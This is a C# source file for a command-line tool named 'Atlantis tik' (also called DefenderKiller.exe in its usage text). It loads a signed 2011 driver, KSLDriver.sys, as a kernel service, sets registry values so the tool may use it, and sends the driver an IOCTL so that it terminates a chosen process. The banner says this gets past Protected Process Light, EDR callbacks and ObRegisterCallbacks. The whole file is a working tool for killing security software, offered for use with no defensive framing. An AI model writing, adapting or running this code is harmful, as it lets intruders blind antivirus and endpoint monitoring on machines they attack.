using System;
using System.Runtime.InteropServices;
using System.Text;

namespace AtlantisTik
{
    class Program
    {
        // Constants
        private const string ServiceName = "AtlantisTik";
        private const string DevicePath = "\\\\.\\AtlantisTik";
        private const uint IOCTL = 0x222044;

        // P/Invoke declarations
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateService(IntPtr hSCManager, string lpServiceName, string lpDisplayName,
            uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl,
            string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies,
            string lpServiceStartName, string lpPassword);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool StartService(IntPtr hService, uint dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ControlService(IntPtr hService, uint dwControl, ref SERVICE_STATUS lpServiceStatus);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DeleteService(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CloseServiceHandle(IntPtr hSCObject);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern int RegOpenKeyEx(IntPtr hKey, string lpSubKey, uint ulOptions, uint samDesired, out IntPtr phkResult);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern int RegSetValueEx(IntPtr hKey, string lpValueName, uint Reserved, uint dwType, byte[] lpData, uint cbData);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern int RegCloseKey(IntPtr hKey);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, byte[] lpInBuffer,
            uint nInBufferSize, byte[] lpOutBuffer, uint nOutBufferSize, out uint lpBytesReturned, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass,
            IntPtr ProcessInformation, uint ProcessInformationLength, out uint ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern uint GetFileAttributes(string lpFileName);

        // Structures
        [StructLayout(LayoutKind.Sequential)]
        private struct SERVICE_STATUS
        {
            public uint dwServiceType;
            public uint dwCurrentState;
            public uint dwControlsAccepted;
            public uint dwWin32ExitCode;
            public uint dwServiceSpecificExitCode;
            public uint dwCheckPoint;
            public uint dwWaitHint;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct PROCESSENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExeFile;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        // Constants for access
        private const uint SC_MANAGER_CREATE_SERVICE = 0x0002;
        private const uint SC_MANAGER_ALL_ACCESS = 0xF003F;
        private const uint SERVICE_ALL_ACCESS = 0xF01FF;
        private const uint SERVICE_KERNEL_DRIVER = 0x00000001;
        private const uint SERVICE_DEMAND_START = 0x00000003;
        private const uint SERVICE_ERROR_IGNORE = 0x00000000;
        private const uint SERVICE_CONTROL_STOP = 0x00000001;
        private const uint GENERIC_READ = 0x80000000;
        private const uint GENERIC_WRITE = 0x40000000;
        private const uint OPEN_EXISTING = 3;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint TH32CS_SNAPPROCESS = 0x00000002;
        private const uint KEY_SET_VALUE = 0x0002;
        private const int ERROR_SERVICE_ALREADY_RUNNING = 1056;
        private const uint PROCESSINFOCLASS_ProcessImageFileName = 27;

        private static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                PrintBanner();
                return;
            }

            string cmd = args[0].ToLowerInvariant();
            try
            {
                if (cmd == "load")
                {
                    if (args.Length < 2)
                    {
                        Console.WriteLine("[-] Usage: DefenderKiller.exe load <path_to_KSLDriver_2011.sys>");
                        return;
                    }
                    CmdLoad(args[1]);
                }
                else if (cmd == "kill")
                {
                    if (args.Length < 2)
                    {
                        Console.WriteLine("[-] Usage: tik.exe kill <PID | process_name>");
                        return;
                    }
                    CmdKill(args[1]);
                }
                else if (cmd == "unload")
                {
                    CmdUnload();
                }
                else
                {
                    Console.WriteLine("[-] Unknown command: " + args[0]);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error: " + ex.Message);
            }
        }

        private static void PrintBanner()
        {
            Console.WriteLine(@"
  Atlantis tik

  Microsoft's own signed driver turned against itself.
  KSLDriver.sys (2011) kernel ZwTerminateProcess.
  Bypasses PPL, EDR callbacks, ObRegisterCallbacks.

  Usage:
    tik.exe load <driver_path>
    tik.exe kill <PID | process_name>
    tik.exe unload
");
        }

        private static bool GetNtPath(out string ntPath)
        {
            ntPath = null;
            IntPtr hProcess = GetCurrentProcess();
            uint returnLength;
            int status = NtQueryInformationProcess(hProcess, (int)PROCESSINFOCLASS_ProcessImageFileName, IntPtr.Zero, 0, out returnLength);
            if (returnLength == 0)
                return false;

            byte[] buffer = new byte[returnLength + 2];
            GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
            try
            {
                IntPtr pBuffer = handle.AddrOfPinnedObject();
                status = NtQueryInformationProcess(hProcess, (int)PROCESSINFOCLASS_ProcessImageFileName, pBuffer, (uint)buffer.Length, out returnLength);
                if (status != 0)
                    return false;

                UNICODE_STRING us = (UNICODE_STRING)Marshal.PtrToStructure(pBuffer, typeof(UNICODE_STRING));
                if (us.Buffer != IntPtr.Zero && us.Length > 0)
                {
                    ntPath = Marshal.PtrToStringUni(us.Buffer, us.Length / 2);
                    return true;
                }
                return false;
            }
            finally
            {
                handle.Free();
            }
        }

        private static bool IsDriverLoaded()
        {
            IntPtr hDevice = CreateFile(DevicePath, GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            if (hDevice != IntPtr.Zero && hDevice != new IntPtr(-1))
            {
                CloseHandle(hDevice);
                return true;
            }
            return false;
        }

        private static void CmdLoad(string driverPath)
        {
            driverPath = System.IO.Path.GetFullPath(driverPath);
            if (GetFileAttributes(driverPath) == 0xFFFFFFFF)
            {
                Console.WriteLine("[-] Driver not found: " + driverPath);
                return;
            }

            IntPtr scm = OpenSCManager(null, null, SC_MANAGER_CREATE_SERVICE);
            if (scm == IntPtr.Zero)
            {
                Console.WriteLine("[-] Access denied. Run as administrator.");
                return;
            }

            try
            {
                Console.WriteLine("[*] Cleaning up stale service...");
                IntPtr oldSvc = OpenService(scm, ServiceName, SERVICE_ALL_ACCESS);
                if (oldSvc != IntPtr.Zero)
                {
                    SERVICE_STATUS ss = new SERVICE_STATUS();
                    ControlService(oldSvc, SERVICE_CONTROL_STOP, ref ss);
                    DeleteService(oldSvc);
                    CloseServiceHandle(oldSvc);
                    System.Threading.Thread.Sleep(500);
                }

                Console.WriteLine("[*] Creating service '" + ServiceName + "'...");
                IntPtr svc = CreateService(scm, ServiceName, ServiceName, SERVICE_ALL_ACCESS,
                    SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                    driverPath, null, IntPtr.Zero, null, null, null);
                if (svc == IntPtr.Zero)
                {
                    int err = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] CreateService failed: " + err);
                    return;
                }

                Console.WriteLine("[*] Configuring registry...");
                string regPath = "SYSTEM\\CurrentControlSet\\Services\\" + ServiceName;
                IntPtr hKey;
                int regResult = RegOpenKeyEx(new IntPtr(0x80000002), regPath, 0, KEY_SET_VALUE, out hKey);
                if (regResult == 0)
                {
                    // DeviceName
                    byte[] dnData = Encoding.Unicode.GetBytes("AtlantisTik\0");
                    RegSetValueEx(hKey, "DeviceName", 0, 1, dnData, (uint)dnData.Length);

                    // ImagePath
                    string imagePath = "\\??\\" + driverPath;
                    byte[] ipData = Encoding.Unicode.GetBytes(imagePath + "\0");
                    RegSetValueEx(hKey, "ImagePath", 0, 1, ipData, (uint)ipData.Length);

                    // AllowedProcessName
                    string ntPath;
                    if (GetNtPath(out ntPath))
                    {
                        byte[] npData = Encoding.Unicode.GetBytes(ntPath + "\0");
                        RegSetValueEx(hKey, "AllowedProcessName", 0, 1, npData, (uint)npData.Length);
                        Console.WriteLine("[*] AllowedProcess: " + ntPath);
                    }

                    RegCloseKey(hKey);
                }

                Console.WriteLine("[*] Starting driver...");
                if (!StartService(svc, 0, null))
                {
                    int err = Marshal.GetLastWin32Error();
                    if (err != ERROR_SERVICE_ALREADY_RUNNING)
                    {
                        Console.WriteLine("[-] StartService failed: " + err);
                        DeleteService(svc);
                        return;
                    }
                }

                CloseServiceHandle(svc);

                Console.WriteLine("[*] Verifying device access...");
                IntPtr hDevice = CreateFile(DevicePath, GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
                if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
                {
                    Console.WriteLine("[-] Device \\\\.\\" + ServiceName + " not accessible");
                    return;
                }
                CloseHandle(hDevice);

                Console.WriteLine("[+] Driver loaded successfully");
                Console.WriteLine("[+] Service: " + ServiceName);
                Console.WriteLine("[+] Device:  \\\\.\\" + ServiceName);
                Console.WriteLine("[+] Driver:  " + driverPath);
            }
            finally
            {
                CloseServiceHandle(scm);
            }
        }

        private static void CmdKill(string target)
        {
            uint pid = 0;
            string procName = "";

            bool isPid = (target.Length > 0 && char.IsDigit(target[0]));

            IntPtr snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snap == IntPtr.Zero || snap == new IntPtr(-1))
            {
                Console.WriteLine("[-] Failed to create snapshot");
                return;
            }

            try
            {
                PROCESSENTRY32 pe = new PROCESSENTRY32();
                pe.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
                if (Process32First(snap, ref pe))
                {
                    do
                    {
                        if (isPid)
                        {
                            if (pe.th32ProcessID == uint.Parse(target))
                            {
                                pid = pe.th32ProcessID;
                                procName = pe.szExeFile;
                                break;
                            }
                        }
                        else
                        {
                            if (string.Equals(pe.szExeFile, target, StringComparison.OrdinalIgnoreCase))
                            {
                                pid = pe.th32ProcessID;
                                procName = pe.szExeFile;
                                break;
                            }
                        }
                    } while (Process32Next(snap, ref pe));
                }
            }
            finally
            {
                CloseHandle(snap);
            }

            if (pid == 0)
            {
                Console.WriteLine("[-] Process not found: " + target);
                return;
            }

            if (pid == 4)
            {
                Console.WriteLine("[-] Cannot kill System process (PID 4)");
                return;
            }

            Console.WriteLine("[*] Target: " + procName + " (PID " + pid + ")");

            if (!IsDriverLoaded())
            {
                Console.WriteLine("[-] Driver not loaded. Run 'load' first.");
                return;
            }

            Console.WriteLine("[*] Opening device...");
            IntPtr hDevice = CreateFile(DevicePath, GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
            {
                Console.WriteLine("[-] Device open failed: " + Marshal.GetLastWin32Error());
                return;
            }

            try
            {
                Console.WriteLine("[*] Setting target PID " + pid + "...");
                byte[] inBuffer = new byte[8];
                byte[] outBuffer = new byte[8];
                BitConverter.GetBytes(8).CopyTo(inBuffer, 0);
                BitConverter.GetBytes(pid).CopyTo(inBuffer, 4);

                uint bytesReturned;
                if (!DeviceIoControl(hDevice, IOCTL, inBuffer, (uint)inBuffer.Length, outBuffer, (uint)outBuffer.Length, out bytesReturned, IntPtr.Zero))
                {
                    Console.WriteLine("[-] IOCTL failed: " + Marshal.GetLastWin32Error());
                    return;
                }

                Console.WriteLine("[*] Closing handle (triggers ZwTerminateProcess)...");
                CloseHandle(hDevice);
                hDevice = IntPtr.Zero;
                System.Threading.Thread.Sleep(300);

                IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine("[+] Process " + procName + " (PID " + pid + ") terminated");
                }
                else
                {
                    CloseHandle(hProcess);
                    Console.WriteLine("[-] PID " + pid + " still alive");
                }
            }
            finally
            {
                if (hDevice != IntPtr.Zero && hDevice != new IntPtr(-1))
                    CloseHandle(hDevice);
            }
        }

        private static void CmdUnload()
        {
            IntPtr scm = OpenSCManager(null, null, SC_MANAGER_ALL_ACCESS);
            if (scm == IntPtr.Zero)
            {
                Console.WriteLine("[-] Access denied");
                return;
            }

            try
            {
                IntPtr svc = OpenService(scm, ServiceName, SERVICE_ALL_ACCESS);
                if (svc == IntPtr.Zero)
                {
                    Console.WriteLine("[*] Service '" + ServiceName + "' not found (already clean)");
                    return;
                }

                SERVICE_STATUS ss = new SERVICE_STATUS();
                Console.WriteLine("[*] Stopping service...");
                ControlService(svc, SERVICE_CONTROL_STOP, ref ss);
                System.Threading.Thread.Sleep(300);

                Console.WriteLine("[*] Deleting service...");
                DeleteService(svc);
                CloseServiceHandle(svc);

                Console.WriteLine("[+] Driver unloaded and service removed");
            }
            finally
            {
                CloseServiceHandle(scm);
            }
        }
    }
}